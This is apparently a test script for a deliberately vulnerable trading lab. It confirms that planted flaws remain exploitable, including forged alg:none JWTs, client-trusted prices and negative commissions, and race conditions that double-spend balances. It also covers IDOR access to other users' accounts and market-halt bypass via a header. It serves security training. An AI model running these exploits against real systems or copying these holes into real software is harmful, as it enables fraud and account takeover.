#!/usr/bin/env python3
"""
VulnTrade 1.0.0: prove that every intended product vulnerability still FIRES.

    python3 test/product_bugs.py --base-url http://192.168.67.2:31080 [--only fx,equities,crypto]

This is the opposite of a security test: each check passes when the bug is exploitable,
exactly as designed (docs/vulnerabilities.md #101-#120 and the re-homed trading vulns).
It uses its own fresh users named bug_<run>_* (test/invariants.py ignores them, because
breaking the money rules is their whole point). Run it against a lab, never anything real.
"""
import argparse
import base64
import json
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from decimal import Decimal as D

import os

import requests

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "bench"))
from stomp import Stomp  # noqa: E402

RUN = uuid.uuid4().hex[:5]
FIRED, MISSED = [], []


def fires(name, ok, detail=""):
    (FIRED if ok else MISSED).append(name)
    print("  [%s] %s%s" % ("FIRES" if ok else "MISSING", name, "" if ok else "  -> %s" % str(detail)[:300]))


class Lab:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.http = requests.Session()

    def user(self, tag):
        name = "bug_%s_%s" % (RUN, tag)
        r = self.http.post(self.base + "/api/auth/register",
                           json={"username": name, "password": "Passw0rd!", "email": name + "@example.test"})
        r.raise_for_status()
        u = r.json()
        u["auth"] = {"Authorization": "Bearer " + u["token"]}
        return u

    def get(self, path, user=None, **kw):
        return self.http.get(self.base + path, headers=(user or {}).get("auth"), timeout=30, **kw)

    def post(self, path, body, user=None, headers=None):
        h = dict((user or {}).get("auth") or {})
        h.update(headers or {})
        return self.http.post(self.base + path, json=body, headers=h, timeout=60)

    def parallel(self, calls):
        with ThreadPoolExecutor(max_workers=len(calls)) as pool:
            return list(pool.map(lambda c: c(), calls))


def alg_none_token(user_id, username, role="TRADER"):
    """An unsigned JWT (alg: none). VULN #56: JwtTokenProvider accepts it."""
    enc = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
    return enc({"alg": "none"}) + "." + enc({"sub": username, "userId": user_id, "role": role,
                                             "exp": int(time.time()) + 3600}) + "."


# ---------------------------------------------------------------------------
# FX
# ---------------------------------------------------------------------------

def fx_balance(lab, user, asset):
    rows = lab.get("/api/fx/balances", user).json()["balances"]
    return next((D(str(b["available"])) for b in rows if b["asset"] == asset), D(0))


def fx_quote(lab, pair="EURUSD"):
    return next(q for q in lab.get("/api/fx/quotes").json() if q["pair"] == pair)


def fx_order(lab, user, body):
    return lab.post("/api/fx/orders", body, user).json()


def fx_section(lab):
    print("FX")
    a = lab.user("fxa")

    q = fx_quote(lab)
    fires("FX-6 price stream leaks bank prices, our margin and the House position",
          bool(q.get("lpQuotes")) and "margin" in q and "houseNet" in q, q)

    old = fx_quote(lab)
    time.sleep(PriceValid.SECONDS + 1)
    r = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "100", "quoteId": old["quoteId"]})
    fires("FX-1 an expired quote (older than 2 s) is still filled at its old price",
          r.get("status") == "FILLED" and D(str(r["price"])) == D(str(old["ask"])), r)

    r = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "1000", "price": "0.0001"})
    fires("FX-2 the client's own price is trusted (1,000 EUR for 0.10 USD)",
          r.get("status") == "FILLED" and D(str(r["pay"]["amount"])) <= D("0.10"), r)

    q = fx_quote(lab)
    r = fx_order(lab, a, {"pair": "EURUSD", "side": "SELL", "amount": "1", "quoteId": q["quoteId"]})
    exact = D(1) * D(str(q["bid"]))
    fires("FX-3 rounding in the client's favour (receive rounded up)",
          r.get("status") == "FILLED" and D(str(r["receive"]["amount"])) > exact, {"receive": r.get("receive"), "exact": exact})

    fx_order(lab, a, {"pair": "USDJPY", "side": "SELL", "amount": "10"})          # get some JPY first
    r = fx_order(lab, a, {"pair": "USDJPY", "side": "BUY", "amount": "100", "amountCurrency": "QUOTE"})
    fires("FX-4 wrong leg: spend 100 JPY, receive ~15,000 USD instead of ~0.66",
          r.get("status") == "FILLED" and D(str(r["receive"]["amount"])) > D(1000), r)

    # FX-5: five parallel 300,000 EUR buys (cheap thanks to FX-2); one by one only 3 fit under the 1M limit
    b = lab.user("fxb")
    results = lab.parallel([lambda: fx_order(lab, b, {"pair": "EURUSD", "side": "BUY", "amount": "300000", "price": "0.0001"})
                            for _ in range(5)])
    filled = sum(1 for r in results if r.get("status") == "FILLED")
    fires("FX-5 exposure check race: parallel orders push the House past its 1,000,000 EUR limit", filled >= 4,
          [r.get("status") + "/" + str(r.get("reason")) for r in results])
    # give the EUR back, so the House is not left at its limit for the next run
    eur = fx_balance(lab, b, "EUR")
    if eur > 0:
        fx_order(lab, b, {"pair": "EURUSD", "side": "SELL", "amount": str(eur), "price": "0.0001"})

    # #43: two parallel buys spend the same USD
    c = lab.user("fxc")
    q = fx_quote(lab)
    results = lab.parallel([lambda: fx_order(lab, c, {"pair": "EURUSD", "side": "BUY", "amount": "8500", "quoteId": q["quoteId"]})
                            for _ in range(4)])
    filled = sum(1 for r in results if r.get("status") == "FILLED")
    fires("#43 (FX) balance race: parallel buys spend the same USD", filled >= 2 and fx_balance(lab, c, "USD") < 0,
          {"filled": filled, "usd": str(fx_balance(lab, c, "USD"))})

    r1 = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "10", "clientOrderId": "dup-" + RUN})
    r2 = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "10", "clientOrderId": "dup-" + RUN})
    fires("#41 (FX) clientOrderId replay: the same id is filled twice",
          r1.get("status") == r2.get("status") == "FILLED" and r1["orderId"] != r2["orderId"], [r1, r2])

    victim = lab.user("fxv")
    before = fx_balance(lab, victim, "USD")
    fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "100", "userId": victim["userId"]})
    fires("#71 (FX) a userId in the body trades from someone else's account", fx_balance(lab, victim, "USD") < before,
          {"before": str(before), "after": str(fx_balance(lab, victim, "USD"))})

    r = lab.get("/api/fx/balances?userId=%s" % victim["userId"], a)
    fires("IDOR (#47 style) ?userId= shows another user's FX balances",
          r.ok and r.json().get("userId") == victim["userId"], r.text)
    r = lab.get("/api/fx/orders?userId=%s" % victim["userId"], a)
    fires("IDOR (#47 style) ?userId= shows another user's FX orders", r.ok and len(r.json()) > 0, r.text)

    forged = alg_none_token(victim["userId"], victim["username"])
    r = lab.http.get(lab.base + "/api/fx/balances", headers={"Authorization": "Bearer " + forged})
    fires("#56 an unsigned (alg:none) token is accepted by the gateway",
          r.ok and r.json().get("userId") == victim["userId"], r.text)
    r = lab.http.get(lab.base + "/api/fx/balances", params={"api_key": a["apiKey"]})
    fires("#15 API key in the URL works on the gateway", r.ok and r.json().get("userId") == a["userId"], r.text)


class PriceValid:
    SECONDS = 2


# ---------------------------------------------------------------------------
# Equities
# ---------------------------------------------------------------------------

def eq_cash(lab, user):
    rows = lab.get("/api/equities/balances", user).json()["balances"]
    usd = next((b for b in rows if b["asset"] == "USD"), {"available": 0, "held": 0})
    return D(str(usd["available"])), D(str(usd["held"]))


def eq_order(lab, user, body, headers=None):
    r = lab.post("/api/equities/orders", body, user, headers)
    try:
        return r.json()
    except ValueError:
        return {"error": r.text}


def eq_price(lab, symbol):
    return lab.get("/api/equities/market/prices/" + symbol).json()


def admin_ws(lab):
    admin = lab.http.post(lab.base + "/api/auth/login", json={"username": "admin", "password": "admin123"}).json()
    ws = Stomp(lab.base.replace("http", "ws", 1) + "/ws", admin["token"])
    ws.subscribe("/user/queue/admin")
    return admin, ws


def equities_section(lab):
    print("Equities")
    a = lab.user("eqa")
    admin, aws = admin_ws(lab)
    admin_h = {"Authorization": "Bearer " + admin["token"]}
    lab.post("/api/accounts/transfer", {"from": "MAIN", "to": "EQUITIES", "amount": "5000"}, a)

    # EQ-1: market closed for REST, still open for "the WebSocket"
    lab.http.post(lab.base + "/api/equities/admin/session", json={"open": False}, headers=admin_h)
    rest = eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "1"})
    ws = eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "1"}, {"X-Channel": "ws"})
    lab.http.post(lab.base + "/api/equities/admin/session", json={"open": True}, headers=admin_h)
    fires("EQ-1 market closed, but X-Channel: ws still trades",
          "closed" in str(rest.get("error", "")).lower() and ws.get("status") == "FILLED", [rest, ws])

    # #46 (as EQ-1): halted symbol, same bypass
    aws.send("/app/admin.haltTrading", {"symbol": "MSFT", "reason": "product_bugs"})
    time.sleep(1)
    rest = eq_order(lab, a, {"symbol": "MSFT", "side": "BUY", "type": "MARKET", "quantity": "1"})
    ws = eq_order(lab, a, {"symbol": "MSFT", "side": "BUY", "type": "MARKET", "quantity": "1"}, {"X-Channel": "ws"})
    aws.send("/app/admin.resumeTrading", {"symbol": "MSFT"})
    time.sleep(1)
    fires("#46 halted stock still trades with X-Channel: ws",
          "halted" in str(rest.get("error", "")).lower() and ws.get("status") == "FILLED", [rest, ws])

    r = eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "0.0001"}, {"X-Channel": "ws"})
    fires("EQ-2 lot size: 0.0001 shares accepted and filled (and EQ-3: no commission under 1 share)",
          r.get("status") == "FILLED" and D(str(r.get("commission") or 0)) == 0, r)

    before, _ = eq_cash(lab, a)
    px = eq_price(lab, "AAPL")
    r = eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "LIMIT", "quantity": "1",
                          "price": str(round(D(str(px["ask"])) * D("1.01"), 2)), "commission": "-50"})
    after, _ = eq_cash(lab, a)
    cost = D(str(r.get("avgFillPrice") or 0))
    fires("EQ-3 commission from the client: -50 means the house pays the buyer $50",
          r.get("status") == "FILLED" and abs((before - after) - (cost - 50)) < D("0.01"),
          {"order": r, "paid": str(before - after), "price": str(cost)})

    poor = lab.user("eqpoor")
    r = eq_order(lab, poor, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "1000"})
    avail, _ = eq_cash(lab, poor)
    fires("EQ-5 a REST market order without a price holds $0 and buys far more than the balance",
          r.get("status") == "FILLED" and avail < 0, {"status": r.get("status"), "cash": str(avail)})

    r1 = eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "150"})
    r2 = eq_order(lab, a, {"symbol": "AAPL", "side": "SELL", "type": "LIMIT", "quantity": "1", "price": "150"})
    fires("EQ-6 / #62 self-trade: own SELL fills own BUY", r2.get("status") == "FILLED"
          and r1.get("status") == "NEW", [r1.get("status"), r2.get("status")])

    live = D(str(eq_price(lab, "NVDA")["ask"]))
    r = eq_order(lab, a, {"symbol": "NVDA", "side": "BUY", "type": "MARKET", "quantity": "1", "exchange": "XTEST"})
    fires("EQ-7 hidden exchange=XTEST fills at prices frozen at startup",
          r.get("status") == "FILLED" and D(str(r.get("avgFillPrice"))) != live * D("1.0001"),
          {"fill": r.get("avgFillPrice"), "live_ask": str(live)})

    # EQ-4: the cancel reads the hold BEFORE it waits for the lock. A burst of small sells queued
    # on the lock fills part of the order meanwhile; the cancel then gives back the whole old hold.
    b, c = lab.user("eqb"), lab.user("eqc")
    eq_order(lab, c, {"symbol": "AMZN", "side": "BUY", "type": "MARKET", "quantity": "40"}, {"X-Channel": "ws"})
    hit = False
    for attempt in range(4):
        px = eq_price(lab, "AMZN")   # between bid and ask: the best bid, so the small sells fill it
        price = str(((D(str(px["bid"])) + D(str(px["ask"]))) / 2).quantize(D("0.01")))
        o = eq_order(lab, b, {"symbol": "AMZN", "side": "BUY", "type": "LIMIT", "quantity": "20", "price": price})
        if not o.get("orderId"):
            break
        sells = [lambda: eq_order(lab, c, {"symbol": "AMZN", "side": "SELL", "type": "LIMIT", "quantity": "1",
                                           "price": price}) for _ in range(8)]
        cancel = lambda: (time.sleep(0.003), lab.post("/api/equities/orders/%s/cancel" % o["orderId"], {}, b))
        lab.parallel(sells + [cancel])
        if eq_cash(lab, b)[1] < 0:
            hit = True
            break
        for x in lab.get("/api/equities/orders", c).json():   # tidy: cancel sells that did not fill
            if x.get("status") in ("NEW", "PARTIAL"):
                lab.post("/api/equities/orders/%s/cancel" % x["id"], {}, c)
    fires("EQ-4 cancel + partial fill race releases the hold twice (held goes negative = free cash)", hit,
          {"held": str(eq_cash(lab, b)[1])})

    # #43: parallel BUYs spend the same available USD
    d = lab.user("eqd")
    px = eq_price(lab, "TSLA")
    qty = int(D(9000) / D(str(px["ask"])))
    lab.parallel([lambda: eq_order(lab, d, {"symbol": "TSLA", "side": "BUY", "type": "LIMIT", "quantity": str(qty),
                                            "price": str(round(D(str(px["bid"])) * D("0.9"), 2))}) for _ in range(4)])
    fires("#43 (equities) parallel BUYs hold the same USD (available goes negative)", eq_cash(lab, d)[0] < 0,
          {"available": str(eq_cash(lab, d)[0])})

    r1 = eq_order(lab, a, {"symbol": "GOOGL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "0.01",
                           "clientOrderId": "dup-" + RUN})
    r2 = eq_order(lab, a, {"symbol": "GOOGL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "0.01",
                           "clientOrderId": "dup-" + RUN})
    fires("#40 no price band (BUY at 0.01 accepted) and #41 clientOrderId replay",
          r1.get("status") == "NEW" and r2.get("status") == "NEW", [r1.get("status"), r2.get("status")])

    victim = lab.user("eqv")
    vo = eq_order(lab, victim, {"symbol": "GOOGL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "1"})
    r = lab.post("/api/equities/orders/%s/cancel" % vo.get("orderId"), {}, a)
    fires("#44 cancel someone else's order (IDOR)", r.status_code == 200 and r.json().get("originalUserId") == victim["userId"], r.text)

    book = lab.get("/api/equities/market/orderbook/GOOGL").json()
    entry = (book.get("bids") or [{}])[0]
    fires("#60 / #72 order book shows user ids, usernames and order ids",
          "userId" in entry and "username" in entry and "orderId" in entry, entry)

    stream = Stomp(lab.base.replace("http", "ws", 1) + "/api/equities/ws", a["token"])
    stream.subscribe("/topic/equities/prices")
    stream.subscribe("/topic/equities/trades")
    tick = stream.wait(lambda dd, bb: dd == "/topic/equities/prices", 5)
    fires("#36 price stream carries internal fields (costBasis, marketMakerId, spreadBps)",
          isinstance(tick, dict) and tick.get("marketMakerId") and "costBasis" in tick, tick)
    eq_order(lab, a, {"symbol": "AAPL", "side": "BUY", "type": "MARKET", "quantity": "1"}, {"X-Channel": "ws"})
    trade = stream.wait(lambda dd, bb: dd == "/topic/equities/trades", 5)
    fires("#61 trade broadcast carries buyer and seller user ids",
          isinstance(trade, dict) and "buyUserId" in trade and "sellUserId" in trade, trade)
    stream.close()

    before = len(lab.get("/api/equities/orders", victim).json())
    eq_order(lab, a, {"symbol": "GOOGL", "side": "BUY", "type": "LIMIT", "quantity": "1", "price": "1",
                      "userId": victim["userId"]})
    fires("#71 (equities) a userId in the body places the order on someone else's account",
          len(lab.get("/api/equities/orders", victim).json()) == before + 1, "")
    r = lab.get("/api/equities/positions?userId=%s" % a["userId"], victim)
    fires("IDOR (#47 style) ?userId= shows another user's shares", r.ok and len(r.json()) > 0, r.text)
    aws.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--only", default="fx,equities,crypto")
    args = ap.parse_args()
    lab = Lab(args.base_url)
    only = args.only.split(",")
    sections = {"fx": fx_section, "equities": equities_section}
    for name in only:
        if name in sections and lab.get("/api/%s/%s" % (name, "pairs" if name == "fx" else "market/prices")).ok:
            sections[name](lab)
    print("\n%d bugs fire, %d missing%s" % (len(FIRED), len(MISSED), (": %s" % MISSED) if MISSED else ""))
    return 0 if not MISSED else 1


if __name__ == "__main__":
    sys.exit(main())
